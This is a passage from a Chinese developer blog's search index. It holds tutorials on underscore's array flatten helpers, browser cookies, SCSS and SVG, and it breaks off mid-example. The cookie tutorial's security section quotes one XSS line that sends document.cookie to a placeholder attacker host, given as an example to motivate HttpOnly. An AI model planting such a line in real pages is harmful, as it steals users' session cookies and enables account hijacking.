的值判断是跳过不处理还是放入 output else if (!strict)&#123; output[idx++] = value; &#125; &#125; return output;&#125; 解释下 strict，在代码里我们可以看出，当遍历数组元素时，如果元素不是数组，就会对 strict 取反的结果进行判断，如果设置 strict 为 true，就会跳过不进行任何处理，这意味着可以过滤非数组的元素，举个例子： 12var arr = [1, 2, [3, 4]];console.log(flatten(arr, true, true)); // [3, 4] 那么设置 strict 到底有什么用呢？不急，我们先看下 shallow 和 strct 各种值对应的结果： shallow true + strict false ：正常扁平一层 shallow false + strict false ：正常扁平所有层 shallow true + strict true ：去掉非数组元素 shallow false + strict true ： 返回一个[] 我们看看 underscore 中哪些方法调用了 flatten 这个基本函数： _.flatten首先就是 _.flatten： 123_.flatten = function(array, shallow) &#123; return flatten(array, shallow, false);&#125;; 在正常的扁平中，我们并不需要去掉非数组元素。 _.union接下来是 _.union： 该函数传入多个数组，然后返回传入的数组的并集， 举个例子： 12_.union([1, 2, 3], [101, 2, 1, 10], [2, 1]);=&gt; [1, 2, 3, 101, 10] 如果传入的参数并不是数组，就会将该参数跳过： 12_.union([1, 2, 3], [101, 2, 1, 10], 4, 5);=&gt; [1, 2, 3, 101, 10] 为了实现这个效果，我们可以将传入的所有数组扁平化，然后去重，因为只能传入数组，这时候我们直接设置 strict 为 true，就可以跳过传入的非数组的元素。 12345678// 关于 unique 可以查看《JavaScript专题之数组去重》[](https://github.com/mqyqingfeng/Blog/issues/27)function unique(array) &#123; return Array.from(new Set(array));&#125;_.union = function() &#123; return unique(flatten(arguments, true, true));&#125; _.difference是不是感觉折腾 strict 有点用处了，我们再看一个 _.difference： 语法为： _.difference(array, *others) 效果是取出来自 array 数组，并且不存在于多个 other 数组的元素。跟 _.union 一样，都会排除掉不是数组的元素。 举个例子： 12_.difference([1, 2, 3, 4, 5], [5, 2, 10], [4], 3);=&gt; [1, 3] 实现方法也很简单，扁平 others 的数组，筛选出 array 中不在扁平化数组中的值： 12345678function difference(array, ...rest) &#123; rest = flatten(rest, true, true); return array.filter(function(item)&#123; return rest.indexOf(item) === -1; &#125;)&#125; 注意，以上实现的细节并不是完全按照 underscore，具体细节的实现感兴趣可以查看源码。 本文转载自：JavaScript专题系列目录地址：https://github.com/mqyqingfeng/Blog。","categories":[{"name":"js","slug":"js","permalink":"https://jiuylq.github.io/categories/js/"}],"tags":[{"name":"Array","slug":"Array","permalink":"https://jiuylq.github.io/tags/Array/"}]},{"title":"cookie 知识小记","slug":"cookie","date":"2019-03-06T16:00:00.000Z","updated":"2019-04-27T16:07:29.977Z","comments":true,"path":"2019/03/07/cookie/","link":"","permalink":"https://jiuylq.github.io/2019/03/07/cookie/","excerpt":"cookie 知识小记日常工作中常常会用到cookie，本文总结了一下cookie的常用只是点，用作笔记。","text":"cookie 知识小记日常工作中常常会用到cookie，本文总结了一下cookie的常用只是点，用作笔记。 cookie 知识小记什么是 cookieHTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据。（摘自MDN） 主要用途 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息） 个性化设置（如用户自定义设置、主题等） 浏览器行为跟踪（如跟踪分析用户行为等） 限制条件 cookie大小： 4KB 规范中限定每个域名下不超过 20 个 cookie，早期的浏览器都遵循该规范，并且在 IE7 中有更近一步的提升。在微软的一次更新中，他们在 IE7 中增加 cookie 的限制数量到 50 个，与此同时 Opera 限定 cookie 数量为 30 个，Safari 和 Chrome 对与每个域名下的 cookie 个数没有限制。 发向服务器的所有 cookie 的最大数量（空间）仍旧维持原始规范中所指出的：4KB。所有超出该限制的 cookie 都会被截掉并且不会发送至服务器。 cookie的基本操作简单添加cookie1document.cookie = \"name=value\" cookie的属性 cookie中的属性是以分号;分隔，以key=value键值对的方式存在 name,value name cookie 的名，一个域名下绑定的cookie，name不能相同，相同的name的值会被覆盖掉 value cookie 的值 规范中明确指出cookie的名/值中的三个字符必须进行编码：分号、逗号和空格 1document.cookie = \"name=value\" 以下为可选属性： expires expires cookie 的过期时间， 如果没有定义，cookie会在对话结束时过期，格式参见Date.toUTCString()（expires=date-in-GMTString-format）,现在已经被max-age属性所取代 12345// days天数var d = new Date();d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));// expires=Thu, 01 Jan 1970 00:00:00 GMTdocument.cookie = name + \"=\" + value + \"; \" + \"expires=\" + d.toUTCString(); max-age max-age cookie 的有效期，单位秒，格式(max-age=max-age-in-seconds) max-age为正数时，cookie会在max-age秒之后，被删除 当max-age为负数时，表示的是临时储存，不会生出cookie文件，只会存在浏览器内存中，且只会在打开的浏览器窗口或者子窗口有效，一旦浏览器关闭，cookie就会消失 当max-age为0时，又会发生什么呢，删除cookie，因为cookie机制本身没有设置删除cookie，失效的cookie会被浏览器自动从内存中删除，所以，它实现的就是让cookie失效 1document.cookie = 'user=TG;max-age=60*60*24'; domain domain 指定Cookie所在的域名，比如example.com，如果指定了一个域，那么子域也包含在内，默认为当前文档位置的路径的域名部分， 所指定的域名必须是当前发送Cookie的域名的一部分，比如当前访问的域名是example.com，就不能将其设为google.com。只有访问的域名匹配domain属性，Cookie才会发送到服务器 1document.cookie = \"name=value;domain=example.com\"; path path 属性用来指定路径（比如/、/mydir），如果未指定，默认为当前文档位置的路径。 (path=path) IE 浏览器(ie6、ie7 和 ie8) 不支持 max-age，所有的浏览器都支持 expires 只有path属性匹配向服务器发送的路径，Cookie才会发送。这里的匹配不是绝对匹配，而是从根路径开始，只要path属性匹配发送路径的一部分，就可以发送。比如，path属性等于/blog，则发送路径是/blog或者/blogroll，Cookie都会发送。path属性生效的前提是domain属性匹配。 1document.cookie = \"name=value;path=/\"; secure secure 属性用来指定Cookie只能在加密协议HTTPS下发送到服务器 1document.cookie = 'test=hello;secure=true'; HttpOnly HttpOnly 属性设为true时，将不能通过js脚本来获取带有 HttpOnly 标记的Cookie，能有效的防止xss攻击。 常用方法的实现（setCookie,getCookie,removeCookie）1、setCookie 123456789101112131415161718192021222324252627282930/** * @desc 设置Cookie * @param &#123;string&#125; name * @param &#123;string&#125; value * @param &#123;Object&#125; opts**/function setCookie(name, value, opts) &#123; // opts: &#123;, // 'domain': '', // 'path': '', // 'expires': '', // 'maxAage': '', // 'secure': '' // &#125; // 对name和value进行编码 value = encodeURIComponent(String(value)).replace(/%(23|24|26|2B|3A|3C|3E|3D|2F|3F|40|5B|5D|5E|60|7B|7D|7C)/g, decodeURIComponent); name = encodeURIComponent(String(name)).replace(/%(23|24|26|2B|5E|60|7C)/g, decodeURIComponent).replace(/[\\(\\)]/g, escape); var options ='' if (opts) &#123; if (opts.expires &amp;&amp; typeof opts.expires === 'number') &#123; opts.expires = new Date(new Date() * 1 + opts.expires * 864e+5).toUTCString(); &#125; for (var i in opts) &#123; if (!opts[i]) continue options += ';' + i options += '=' + opts[i] &#125; &#125; document.cookie = name + '=' + value + options;&#125; 2、getCookie 12345678910111213141516171819/** * @desc getCookie * @param &#123;string&#125; name**/function decode (s) &#123; return s.replace(/(%[0-9A-Z]&#123;2&#125;)+/g, decodeURIComponent);&#125;function getCookie(name) &#123; var cookies = document.cookie.split('; '); var keyVal = &#123;&#125;; for (var i = 0; i&lt; cookies.length; i++) &#123; var part = cookies[i].split('='); if (decode(part[0]) === name) &#123; keyVal[name] = decode(part[1]) break; &#125; &#125; return name ? keyVal[name] : '';&#125; 3、removeCookie 1234567/** * @desc getCookie * @param &#123;string&#125; name**/function removeCookie(name) &#123; setCookie(name, 1, &#123;'expires': -1&#125;);&#125; MDN示例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/*\\|*||*| :: cookies.js ::|*||*| A complete cookies reader/writer framework with full unicode support.|*||*| https://developer.mozilla.org/en-US/docs/DOM/document.cookie|*||*| This framework is released under the GNU Public License, version 3 or later.|*| http://www.gnu.org/licenses/gpl-3.0-standalone.html|*||*| Syntaxes:|*||*| * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])|*| * docCookies.getItem(name)|*| * docCookies.removeItem(name[, path], domain)|*| * docCookies.hasItem(name)|*| * docCookies.keys()|*|\\*/// document.cookie.replace(/(?:(?:^|.*;\\s*)test2\\s*\\=\\s*([^;]*).*$)|^.*$/, \"$1\");var docCookies = &#123; getItem: function (sKey) &#123; return decodeURIComponent(document.cookie.replace(new RegExp(\"(?:(?:^|.*;)\\\\s*\" + encodeURIComponent(sKey).replace(/[-.+*]/g, \"\\\\$&amp;\") + \"\\\\s*\\\\=\\\\s*([^;]*).*$)|^.*$\"), \"$1\")) || null; &#125;, setItem: function (sKey, sValue, vEnd, sPath, sDomain, bSecure) &#123; if (!sKey || /^(?:expires|max\\-age|path|domain|secure)$/i.test(sKey)) &#123; return false; &#125; var sExpires = \"\"; if (vEnd) &#123; switch (vEnd.constructor) &#123; case Number: sExpires = vEnd === Infinity ? \"; expires=Fri, 31 Dec 9999 23:59:59 GMT\" : \"; max-age=\" + vEnd; break; case String: sExpires = \"; expires=\" + vEnd; break; case Date: sExpires = \"; expires=\" + vEnd.toUTCString(); break; &#125; &#125; document.cookie = encodeURIComponent(sKey) + \"=\" + encodeURIComponent(sValue) + sExpires + (sDomain ? \"; domain=\" + sDomain : \"\") + (sPath ? \"; path=\" + sPath : \"\") + (bSecure ? \"; secure\" : \"\"); return true; &#125;, removeItem: function (sKey, sPath, sDomain) &#123; if (!sKey || !this.hasItem(sKey)) &#123; return false; &#125; document.cookie = encodeURIComponent(sKey) + \"=; expires=Thu, 01 Jan 1970 00:00:00 GMT\" + ( sDomain ? \"; domain=\" + sDomain : \"\") + ( sPath ? \"; path=\" + sPath : \"\"); return true; &#125;, hasItem: function (sKey) &#123; return (new RegExp(\"(?:^|;\\\\s*)\" + encodeURIComponent(sKey).replace(/[-.+*]/g, \"\\\\$&amp;\") + \"\\\\s*\\\\=\")).test(document.cookie); &#125;, keys: /* optional method: you can safely remove it! */ function () &#123; var aKeys = document.cookie.replace(/((?:^|\\s*;)[^\\=]+)(?=;|$)|^\\s*|\\s*(?:\\=[^;]*)?(?:\\1|$)/g, \"\").split(/\\s*(?:\\=[^;]*)?;\\s*/); for (var nIdx = 0; nIdx &lt; aKeys.length; nIdx++) &#123; aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]); &#125; return aKeys; &#125;&#125;; 安全路径限制并不能阻止从其他路径访问cookie. 使用简单的DOM即可轻易地绕过限制(比如创建一个指向限制路径的, 隐藏的iframe, 然后访问其 contentDocument.cookie 属性). 保护cookie不被非法访问的唯一方法是将它放在另一个域名/子域名之下, 利用同源策略保护其不被读取. Web应用程序通常使用cookies来标识用户身份及他们的登录会话. 因此通过窃听这些cookie, 就可以劫持已登录用户的会话. 窃听的cookie的常见方法包括社会工程和XSS攻击 - 1(new Image()).src = \"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document.cookie; HttpOnly 属性可以阻止通过javascript访问cookie, 从而一定程度上遏制这类攻击. 参考资料： MDN js-cookie HTTP cookie详解 Javascript 半知半解","categories":[{"name":"Javascript","slug":"Javascript","permalink":"https://jiuylq.github.io/categories/Javascript/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://jiuylq.github.io/tags/Javascript/"}]},{"title":"SCSS 入门","slug":"scss","date":"2018-12-13T08:31:09.000Z","updated":"2019-04-07T05:20:53.417Z","comments":true,"path":"2018/12/13/scss/","link":"","permalink":"https://jiuylq.github.io/2018/12/13/scss/","excerpt":"SCSS 是 Sass 3 引入的新语法，语法上完全兼容原生 CSS，功能上完全继承 Sass，可以说是 CSS 和 Sass 的完美融合。SCSS 之于 Sass 犹如 CSS3 之于 CSS，ES6 之于 JS。所以别纠结，其实是一个东西啦。","text":"SCSS 是 Sass 3 引入的新语法，语法上完全兼容原生 CSS，功能上完全继承 Sass，可以说是 CSS 和 Sass 的完美融合。SCSS 之于 Sass 犹如 CSS3 之于 CSS，ES6 之于 JS。所以别纠结，其实是一个东西啦。 scss入门篇 链接 是 Sass 还是 SCSS？ SCSS 是 Sass 3 引入的新语法，语法上完全兼容原生 CSS，功能上完全继承 Sass，可以说是 CSS 和 Sass 的完美融合。SCSS 之于 Sass 犹如 CSS3 之于 CSS，ES6 之于 JS。所以别纠结，其实是一个东西啦。 一、嵌套写法css原生写法123456.page .content .left-side .profile .name&#123; font-size: 2rem;&#125;.page .content .left-side .profile .age&#123; color: red;&#125; scss写法1234567891011121314.page&#123; .content&#123; .left-side&#123; .profile&#123; .name&#123; font-size: 2rem; &#125; .age&#123; color: red; &#125; &#125; &#125; &#125;&#125; 编译后12.page .content .left-side .profile .name&#123;font-size: 2rem;&#125;.page .content .left-side .profile .age&#123;color: red;&#125; 二、属性值的复用——定义变量 变量一直是所有编程语言的标准配置。然而 CSS 就没有，再次证明 CSS 可能是一门假语言。好在 Sass 补上了这个短板。css原生写法1234567891011.success-bg&#123; background: #dff0d8;&#125;.success-panel&#123; .panel-heading&#123; background: #dff0d8; &#125; .panel-body&#123; border: 1px solid #dff0d8; &#125;&#125; scss写法123456789101112$success-color: #dff0d8;.success-bg&#123; background: $success-color;&#125;.success-panel&#123; .panel-heading&#123; background: $success-color; &#125; .panel-body&#123; border: 1px solid $success-color; &#125;&#125; 三、文件级的复用——模块系统 模块化是软件工程的第一要务，是大型项目的必需建筑。软件工程的主要目标就是控制复杂度，这也正是模块化的目的。通过将一个大型复杂的工程拆解成一个个的小模块，使得校验、调试、测试都轻而易举。CSS原生的 @import 提供了一个并没有卵用的假模块系统。Sass 对 @import 进行了拓展，实现了一个真正意义上甚至功能更强大的模块系统。Sass 选择对 @import 进行扩展，而不是新建一个指令，可见 import 这个关键字的语义之强，JavaScript 模块系统的关键字也是 import。css原生写法12345&lt;!-- index.html --&gt;&lt;link rel=\"stylesheet\" href=\"/your/site/common.css\"&gt;&lt;link rel=\"stylesheet\" href=\"/your/site/popup.css\"&gt;&lt;link rel=\"stylesheet\" href=\"/your/site/module_a.css\"&gt;&lt;link rel=\"stylesheet\" href=\"/your/site/site.css\"&gt; scss写法1234/* site.scss */@import \"common\";@import \"popup\";@import \"module_a\"; 12&lt;!-- index.html --&gt;&lt;link rel=\"stylesheet\" href=\"/your/site/site.css\"&gt; 四、展示层的复用——混合指令 混合(mixin)特别类似于 JavaScript 中的函数，然而 Sass 提供了用于表达式计算的 @function 函数指令，这里就不好这么类比了。但其实就是这么个东西，调用的时候会返回一段样式。Mixin是SASS中非常强大的特性之一。定义mixin时，需要在前面加@mixin，使用时需要添加@include来引用该mixin。比如下面一段存在重复样式的代码。复用之前12345678910.description&#123; color: red; border: 1px solid #e3e3e3; border-radius: 2px;&#125;.article&#123; color: #444; border: 1px solid #e3e3e3; border-radius: 2px;&#125; 稍作优化12345678910.description, .article&#123; border: 1px solid #e3e3e3; border-radius: 2px;&#125;.description&#123; color: red;&#125;.article&#123; color: #444;&#125; 似乎不错，但是之后再新加类似样式时，123456789.description, .article, .style01, .style02&#123; border: 1px solid #e3e3e3; border-radius: 2px;&#125;....style01&#123;&#125;.style02&#123;&#125; 每次都要改两个地方，很麻烦，很容易漏，尤其是将通用样式分离出来的话更容易出错。再做优化：12345678910.grey-border-radius&#123; border: 1px solid #e3e3e3; border-radius: 2px;&#125;.description&#123; color: red;&#125;.article&#123; color: #444;&#125; 似乎好了一点，但这样的话，html 每个使用的标签都需要多加上一个 .grey-border-radius 类。很显然这是多余的。这种做法可以说是“凑合”。使用 Sass 复用之后：123456789101112@mixin grey-border-radius&#123; border: 1px solid #e3e3e3; border-radius: 2px;&#125;.description&#123; @include grey-border-radius; color: red;&#125;.article&#123; @include grey-border-radius; color: #444;&#125; 编译后的 css 输出：12345678910.description &#123; border: 1px solid #e3e3e3; border-radius: 2px; color: red;&#125;.article &#123; border: 1px solid #e3e3e3; border-radius: 2px; color: #444;&#125; 继承123456789101112131415161718192021222324252627282930313233343536373839404142@include aa@extend aa@function$baseFontSize: 10px !default;$gray: #ccc !default;@function pxToRem($px) &#123; @return $px / baseFontSize * 1rem;&#125;body&#123; font-size:$baseFontSize; color:lighten($gray,10%);&#125;.text&#123; font-size:pxToRem(16px); color:darken($gray,10%);&#125;$ite7: true;$type: m0onster;.ib&#123; display:inline-block; @if $ite7 &#123; *display:inline; *zoom:1; &#125;&#125;p&#123; @if $type == ocean &#123; color: blue; &#125; @else if $type == matador &#123; color:red; &#125; @else if $type == monster &#123; color: green; &#125; @else &#123; color: black; &#125;&#125; 三目判断语法： if($condition, $if_true, $if_false)三个参数分别表示：条件，条件为真的值，条件为假的值 12if(true, 1px, 2px) =&gt; 1px if(false, 1px, 2px) =&gt; 2px for 循环for循环有两种形式，分别为：@rot $var from through 和 @for $var from to 。$i表示变量，start表示起始值，end表示结束值，这两个的区别是关键字through表示包括end这个数，而to则不包括end这个数。123456789101112131415161718192021222324252627@for $i from 1 through 3&#123; .item-#&#123;$i&#125; &#123; width: 2em * $i; &#125;&#125;========css.item-1&#123; width: 2em;&#125;.item-2&#123; width: 4em;&#125;.item-3 &#123; width: 6em;&#125;@for $i from 1 to 3 &#123; .item-#&#123;$i&#125; &#123; width: 2em * $i; &#125;&#125;=========css.item-1 &#123; width: 2em;&#125;.item-2 &#123; width: 4em;&#125; @each循环语法为：@each $var in 。其中$var表示变量，而list和map表示list的类型数据和map的类型数据。 123456789101112$animal-list: puma, sea-slug, egret, salamander;@each $animal in $ $animal-list &#123; .#&#123;$animal&#125;-icon &#123; background-image: url('/images/#&#123;$animal&#125;.png'); &#125;&#125;.puma-icon &#123; background-image: url('/images/puma.png');&#125;.sea-slug-icon &#123; bnackground-image: url('/images/sea-slug.png')&#125;","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://jiuylq.github.io/tags/CSS/"}]},{"title":"SVG 入门","slug":"SVG","date":"2018-12-13T08:31:09.000Z","updated":"2019-04-07T05:15:36.115Z","comments":true,"path":"2018/12/13/SVG/","link":"","permalink":"https://jiuylq.github.io/2018/12/13/SVG/","excerpt":"SVG 可缩放矢量图形（Scalable Vector Graphics，SVG)，是一种用来描述二维矢量图形的 XML 标记语言","text":"SVG 可缩放矢量图形（Scalable Vector Graphics，SVG)，是一种用来描述二维矢量图形的 XML 标记语言 SVG一、概述可缩放矢量图形（Scalable Vector Graphics，SVG)，是一种用来描述二维矢量图形的 XML 标记语言。 优势： SVG 可被非常多的工具读取和修改（比如记事本） SVG 与 JPEG 和 GIF 图像比起来，尺寸更小，且可压缩性更强。 SVG 是可伸缩的 SVG 图像可在任何的分辨率下被高质量地打印 SVG 可在图像质量不下降的情况下被放大 SVG 图像中的文本是可选的，同时也是可搜索的（很适合制作地图） SVG 可以与 Java 技术一起运行 SVG 是开放的标准 SVG 文件是纯粹的 XML 兼容性 SVG 于 2003 年 1 月 14 日成为 W3C 推荐标准。 二、SVG 实例12345678&lt;?xml version=\"1.0\" standalone=\"no\"?&gt;&lt;!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"&gt;&lt;svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\"&gt; &lt;circle cx=\"100\" cy=\"50\" r=\"40\" stroke=\"black\" stroke-width=\"2\" fill=\"red\" /&gt;&lt;/svg&gt; 解析： 第一行包含了 XML 声明。请注意 standalone 属性！该属性规定此 SVG 文件是否是”独立的”，或含有对外部文件的引用。standalone=”no” 意味着 SVG 文档会引用一个外部文件 - 在这里，是 DTD 文件。 第二和第三行引用了这个外部的 SVG DTD。该 DTD 位于 “http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;。该 DTD 位于 W3C，含有所有允许的 SVG 元素。 SVG 代码以&lt;svg&gt;元素开始，包括开启标签&lt;svg&gt;和关闭标签&lt;/svg&gt;。这是根元素。width 和 height 属性可设置此 SVG 文档的宽度和高度。version 属性可定义所使用的 SVG 版本，xmlns 属性可定义 SVG 命名空间。 stroke 和 stroke-width 属性控制如何显示形状的轮廓。fill 属性设置形状内的颜色。 注释：所有的开启标签必须有关闭标签！ 三、页面中使用SVG SVG可以直接嵌入到HTML页面中使用 SVG代码也可以写在一个独立文件中，然后用&lt;img&gt;、&lt;object&gt;、&lt;embed&gt;、&lt;iframe&gt;等标签插入网页 CSS 也可以使用 SVG 文件 SVG 文件还可以转为 BASE64 编码，然后作为 Data URI 写入网页。 eg: 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;!-- 直接在html中写SVG代码 --&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;svgid=\"mysvg\"xmlns=\"http://www.w3.org/2000/svg\"viewBox=\"0 0 800 600\"preserveAspectRatio=\"xMidYMid meet\"&gt;&lt;circle id=\"mycircle\" cx=\"400\" cy=\"300\" r=\"50\" /&gt;&lt;svg&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- 通过标签引入SVG --&gt;&lt;img src=\"circle.svg\"&gt;&lt;object id=\"object\" data=\"circle.svg\" type=\"image/svg+xml\"&gt;&lt;/object&gt;&lt;!-- &lt;object&gt;:优势：所有主要浏览器都支持，并支持HTML4，XHTML和HTML5标准缺点：不允许使用脚本。 --&gt;&lt;embed id=\"embed\" src=\"icon.svg\" type=\"image/svg+xml\"&gt;&lt;!-- &lt;embed&gt;:优势：所有主要浏览器都支持，并允许使用脚本缺点：不推荐在HTML4和XHTML中使用（但在HTML5允许） --&gt;&lt;iframe id=\"iframe\" src=\"icon.svg\"&gt;&lt;/iframe&gt;&lt;!-- &lt;iframe&gt;:优势：所有主要浏览器都支持，并允许使用脚本缺点：不推荐在HTML4和XHTML中使用（但在HTML5允许） --&gt;&lt;!-- css中引入SVG --&gt;.logo &#123;background: url(icon.svg);&#125;&lt;!-- 转为 BASE64 编码引入 --&gt;&lt;img src=\"data:image/svg+xml;base64,[data]\"&gt; 四、语法SVG ShapesSVG有一些预定义的形状元素，可被开发者使用和操作： 矩形 &lt;rect&gt; 圆形 &lt;circle&gt; 椭圆 &lt;ellipse&gt; 线 &lt;line&gt; 折线 &lt;polyline&gt; 多边形 &lt;polygon&gt; 路径 &lt;path&gt; &lt;svg&gt;标签 SVG 代码都放在顶层标签&lt;svg&gt;之中。 123&lt;svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\" viewBox=\"50 50 50 50\"&gt; &lt;!-- svg stuff here --&gt; &lt;/svg&gt; &lt;svg&gt;的width属性和height属性，指定了 SVG 图像在 HTML 元素中所占据的宽度和高度。除了相对单位，也可以采用绝对单位（单位：像素）。如果不指定这两个属性，SVG 图像默认大小是300像素（宽） x 150像素（高）。如果只想展示 SVG 图像的一部分，就要指定viewBox属性。 View box——这个值允许我们指定一组图像伸展开来适应一个特定的容器元素。viewBox属性的值是一个包含四个数字的列表。min-x,min-y,width,height。 viewBox属性的四个值，分别是左上角的横坐标和纵坐标、视口的宽度和高度。下面代码中，SVG 图像是100像素宽 x 100像素高，viewBox属性指定视口从(50, 50)这个点开始。所以，实际看到的是右下角的四分之一圆。 注意，视口必须适配所在的空间。下面代码中，视口的大小是 50 x 50，由于 SVG 图像的大小是 100 x 100，所以视口会放大去适配 SVG 图像的大小，即放大了四倍。 如果不指定width属性和height属性，只指定viewBox属性，则相当于只给定 SVG 图像的长宽比。这时，SVG 图像的默认大小将等于所在的 HTML 元素的大小。 123&lt;svg width=\"100\" height=\"100\" viewBox=\"50 50 50 50\"&gt;&lt;circle id=\"mycircle\" cx=\"50\" cy=\"50\" r=\"50\" /&gt;&lt;/svg&gt; &lt;rect&gt; 标签 &lt;rect&gt;标签用于绘制矩形。 123&lt;svg width=\"300\" height=\"120\"&gt; &lt;rect x=\"10\" y=\"10\" rx=\"20\" ry=\"20\" height=\"100\" width=\"200\" style=\"stroke: #70d5dd; stroke-width: 3px; fill: #dd524b; fill-opacity:0.1; stroke-opacity:0.9; opacity:0.5;\" /&gt;&lt;/svg&gt; x —— 指定了矩形左上角端点的横坐标； y —— 指定了矩形左上角端点的纵坐标； rx —— 用于指定圆角x轴的弧度； ry —— 用于指定圆角y轴的弧度； width —— 属性指定了矩形的宽度（单位像素）； height —— 属性指定了矩形的高度（单位像素）; CSS属性 fill —— CSS属性定义矩形的填充颜色（rgb 值、颜色名或者十六进制值）； stroke-width 属性定义矩形边框的宽度； stroke —— 属性定义矩形边框的颜色; fill-opacity —— 属性定义填充颜色透明度（合法的范围是：0 - 1）； stroke-opacity —— 属性定义轮廓颜色的透明度（合法的范围是：0 - 1）； opacity —— 属性用于定义了元素的透明值 (范围: 0 到 1)； &lt;circle&gt;标签 &lt;circle&gt;标签用于绘制圆形 123&lt;svg width=\"300\" height=\"180\"&gt; &lt;circle cx=\"50\" cy=\"50\" r=\"25\" style=\"stroke: #9AFF02; stroke-width: 3px; fill: red;\" /&gt;&lt;/svg&gt; cx —— 定义圆点的x坐标（单位为像素）； cy —— 定义圆点的y坐标 （单位为像素）； r —— 半径 （单位为像素）；坐标都是相对于&lt;svg&gt;画布的左上角原点。 &lt;ellipse&gt;标签 &lt;ellipse&gt;标签用于绘制椭圆 123&lt;svg width=\"300\" height=\"180\"&gt; &lt;ellipse cx=\"60\" cy=\"60\" ry=\"40\" rx=\"20\" stroke=\"#9AFF02\" stroke-width=\"3\" fill=\"red\"/&gt;&lt;/svg&gt; cx —— 定义椭圆中心的x坐标 cy —— 定义椭圆中心的y坐标 rx —— 定义椭圆的水平半径 ry —— 定义椭圆的垂直半径 &lt;line&gt;标签&lt;line&gt;标签用来绘制直线 123&lt;svg width=\"300\" height=\"180\"&gt; &lt;line x1=\"10\" y1=\"50\" x2=\"100\" y2=\"50\" style=\"stroke:#9AFF02;stroke-width:3\" /&gt;&lt;/svg&gt; x1 —— 定义线段起点的横坐标 y1 —— 定义线段起点的纵坐标 x2 —— 定义线段终点的横坐标 y2 —— 定义线段终点的纵坐标 &lt;polyline&gt;标签 &lt;polyline&gt;标签用于绘制一根折线 123&lt;svg width=\"300\" height=\"180\"&gt; &lt;polyline points=\"20,20 60,40 80,90 150,50 200,130\" style=\"fill:none;stroke:#9AFF02;stroke-width:3\" /&gt;&lt;/svg&gt; points —— 属性指定了每个端点的坐标x、y，x坐标与y坐标之间与逗号分隔，点与点之间用空格分隔。 &lt;polygon&gt;标签 &lt;polygon&gt;标签用于绘制多边形 123&lt;svg width=\"300\" height=\"180\"&gt; &lt;polygon fill=\"green\" stroke=\"orange\" stroke-width=\"1\" points=\"0,0 100,0 100,100 0,100 0,0\"/&gt;&lt;/svg&gt; points —— 属性指定了每个端点的坐标x、y，x坐标与y坐标之间与逗号分隔，点与点之间用空格分隔。 fill-rule —— 确定一个形状的“内部”，有效值: nonzero | evenodd | inherit : nonzero字面意思是“非零”。按该规则，要判断一个点是否在图形内，从该点作任意方向的一条射线，然后检测射线与图形路径的交点情况。从0开始计数，路径从左向右穿过射线则计数加1，从右向左穿过射线则计数减1。得出计数结果后，如果结果是0，则认为点在图形外部，否则认为在内部 Example fillrule-nonzero - demonstrates fill-rule:nonzero evenodd字面意思是“奇偶”。按该规则，要判断一个点是否在图形内，从该点作任意方向的一条射线，然后检测射线与图形路径的交点的数量。如果结果是奇数则认为点在内部，是偶数则认为点在外部 Example fillrule-evenodd - demonstrates fill-rule:evenodd 更多案例：http://www.runoob.com/svg/svg-polygon.html &lt;path&gt;标签 &lt;path&gt;标签用于制路径 123456789101112&lt;svg width=\"300\" height=\"180\"&gt; &lt;path d=\" M 18,3 L 46,3 L 46,40 L 61,40 L 32,68 L 3,40 L 18,40 Z \"&gt;&lt;/path&gt;&lt;/svg&gt; M = moveto L = lineto H = horizontal lineto V = vertical lineto C = curveto S = smooth curveto Q = quadratic Bézier curve T = smooth quadratic Bézier curveto A = elliptical Arc Z = closepath | 指令 | 参数 | 描述 ||:—-|:—-|:—-|| M | x y | 起始点坐标x y （Move to） || L | x y | 冲当前点的坐标画直线到指定点的x y坐标（Line to） || H | x | 从当前点的坐标画水平直线到指定的x轴坐标（Horizontal line to） || V | y | 从当前点的坐标画垂直直线到指定的y轴坐标（Vertical line to） || C | x1 y1 x2 y2 x y | 从当前点的坐标画条贝塞尔线到指定点的x y坐标，其中x1 y1及x2,y2为控制点（Curve） || S | x2 y2 x y | 从当前点的坐标画条反射的贝塞曲线到指定点的x, y坐标，其中x2, y2为反射的控制点（Smooth curve） || Q | x2 y2 x y | 从当前点的坐标画条反射的贝塞曲线到指定点的x, y坐标，其中x2, y2为反射的控制点（Smooth curve） || T | x y | 从当前点的坐标画条反射二次贝塞曲线到指定点的x, y坐标，以前一个坐标为反射控制点（Smooth Quadratic Bézier curve） || A | rx ry x-axis-rotation large-arc-flag sweep-flag x y | 从当前点的坐标画个椭圆形到指定点的x, y坐标，其中rx, ry为椭圆形的x轴及y轴的半径，x-axis-rotation是弧线与x轴的旋转角度，large-arc-flag则设定1最大角度的弧线或是0最小角度的弧线，sweep-flag设定方向为1顺时针方向或0逆时针方向（Arc） || Z | | 关闭路径，将当前点坐标与第一个点的坐标连接起来（Closepath） | 注意：以上所有命令均允许小写字母。大写代表绝对坐标，小写代表与前一个坐标的相对座标。 &lt;text&gt; 标签 &lt;text&gt;标签用于绘制文本 1234567891011121314151617181920212223242526272829303132333435363738 &lt;svg width=\"300\" height=\"180\"&gt; &lt;text x=\"50\" y=\"25\"&gt;Hello World&lt;/text&gt; &lt;/svg&gt; ``` &lt;svg width=\"300\" height=\"180\" fill=\"red\"&gt; &lt;text x=\"50\" y=\"25\"&gt;Hello World&lt;/text&gt; &lt;/svg&gt;10. `&lt;use&gt;` 标签 `&lt;use&gt;` 标签用于复制一个形状 ``` xml &lt;svg viewBox=\"0 0 30 10\" xmlns=\"http://www.w3.org/2000/svg\"&gt; &lt;circle id=\"myuse\" 